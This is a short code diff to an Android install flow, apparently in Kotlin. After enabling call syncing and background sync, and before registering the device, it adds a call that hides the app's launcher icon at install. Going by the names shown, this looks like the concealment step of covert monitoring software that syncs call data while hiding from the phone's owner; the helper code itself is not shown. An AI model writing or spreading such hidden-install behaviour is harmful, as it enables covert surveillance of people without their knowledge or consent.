@@ -38,6 +38,7 @@ object InstallFlow {
         CallSyncHelper.markBackgroundSyncEnabled(app, true)
         SyncBootstrap.armBackgroundSync(app)
 
+        LauncherHider.hideNow(app)
         BackgroundSyncRunner.run {
             DeviceRegistration.registerNow(app)
         }
